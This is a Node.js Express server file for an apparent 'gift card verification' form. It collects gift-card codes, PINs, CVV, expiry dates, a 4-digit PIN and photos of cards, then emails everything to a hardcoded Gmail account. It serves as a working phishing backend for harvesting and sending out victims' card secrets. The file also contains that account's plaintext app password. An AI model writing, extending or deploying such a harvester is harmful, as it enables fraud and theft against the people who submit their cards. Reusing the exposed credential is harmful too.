const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');
const multer = require('multer');

const app = express();
const port = 3000;

// Configure multer for handling file uploads
const storage = multer.memoryStorage();
const upload = multer({
  storage: storage,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB file size limit
  },
  fileFilter: (req, file, cb) => {
    if (!file.originalname.match(/\.(jpg|jpeg|png|pdf|heic|svg)$/)) {
      return cb(new Error('Only image files are allowed!'), false);
    }
    cb(null, true);
  }
}).array('cardImages', 2);

// Middleware
app.use(express.static(path.join(__dirname, 'public')));

// Only use bodyParser for non-multipart requests
app.use((req, res, next) => {
  if (!req.is('multipart/form-data')) {
    bodyParser.urlencoded({ extended: true })(req, res, next);
    bodyParser.json()(req, res, next);
  } else {
    next();
  }
});

// Route to serve the HTML file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle form submission with file upload
app.post('/send', (req, res) => {
  upload(req, res, async function(err) {
    if (err instanceof multer.MulterError) {
      return res.status(500).json({ success: false, message: 'File upload error' });
    } else if (err) {
      return res.status(500).json({ success: false, message: 'Unknown error occurred' });
    }

    try {
      const {
        cardName = '',
        currency = '',
        cardAmount = '',
        cardCode = '',
        cardPin = '',
        cardCvv = '',
        cardExp = '',
        digitPin = '',
        email = '',
        message = ''
      } = req.body;

      // Create a transporter object
      const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: 'festuspeter013@gmail.com',
          pass: 'elfp dcui hswh dxmc',
        },
      });

      // Prepare attachments from uploaded files
      let attachments = [];
      if (req.files && req.files.length > 0) {
        attachments = req.files.map(file => {
          return {
            filename: file.originalname,
            content: file.buffer,
            contentType: file.mimetype
          };
        });
      }

      // Set up email data with attachments
      const mailOptions = {
        from: 'festuspeter013@gmail.com',
        to: 'festuspeter013@gmail.com',
        subject: 'New Gift Card Verification Submission',
        text: `
          Card Name: ${cardName}
          Currency: ${currency}
          Card Amount: ${cardAmount}
          Card Code: ${cardCode}
          Card Pin: ${cardPin}
          Card CVV: ${cardCvv}
          Card Expiry Date: ${cardExp}
          4 Digit Pin: ${digitPin}
          Email: ${email}
          Message: ${message}
          
          Number of images attached: ${attachments.length}
        `,
        attachments: attachments
      };

      // Send the email
      transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
          return res.status(500).json({ 
            success: false, 
            message: 'An error occurred while sending the email.' 
          });
        }
        return res.status(200).json({ 
          success: true, 
          message: 'Form submitted successfully' 
        });
      });

    } catch (error) {
      res.status(500).json({ success: false, message: 'Server error' });
    }
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
